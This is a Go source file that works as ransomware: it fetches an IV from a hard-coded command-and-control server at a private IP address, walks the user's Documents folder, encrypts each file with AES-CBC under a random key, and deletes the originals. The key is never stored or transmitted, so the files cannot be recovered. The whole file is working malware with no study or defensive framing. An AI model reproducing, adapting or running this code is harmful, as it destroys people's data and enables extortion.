package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

const C2_URL = "http://10.5.123.238:8080/api/v1/get_config"
var AESKey []byte

func main() {
	AESKey = make([]byte, 32)
	if _, err := rand.Read(AESKey); err != nil {
		fmt.Println("Error generating key")
		return
	}

	fmt.Println("[*] Requesting IV from C2...")
	resp, err := http.Get(C2_URL)
	if err != nil {
		fmt.Println("Failed to connect to C2. Ensure the C2 listener is running.")
		return
	}
	defer resp.Body.Close()

	encodedIV, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	iv, err := base64.StdEncoding.DecodeString(string(encodedIV))
	if err != nil {
		fmt.Println("Failed to decode IV from C2")
		return
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Failed to get home directory")
		return
	}
	targetDir := filepath.Join(homeDir, "Documents")
	fmt.Printf("[*] Starting encryption on directory: %s\n", targetDir)

	err = filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		if filepath.Ext(path) == ".enc" {
			return nil
		}

		plaintext, err := ioutil.ReadFile(path)
		if err != nil {
			return nil
		}

		ciphertext, _ := encryptAES(AESKey, iv, plaintext)

		encryptedPath := path + ".enc"

		err = ioutil.WriteFile(encryptedPath, ciphertext, info.Mode())
		if err != nil {
			return nil
		}

		err = os.Remove(path)
		if err == nil {
			fmt.Printf("[+] SUCCESS: %s -> %s\n", info.Name(), filepath.Base(encryptedPath))
		}

		return nil
	})

	if err != nil {
		fmt.Printf("Error scanning directory: %v\n", err)
	}

	fmt.Println("[*] Encryption process complete.")
	select {}
}

func encryptAES(key, iv, text []byte) ([]byte, error) {
	block, _ := aes.NewCipher(key)
	padding := aes.BlockSize - (len(text) % aes.BlockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	plaintext := append(text, padtext...)
	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, plaintext)
	return ciphertext, nil
}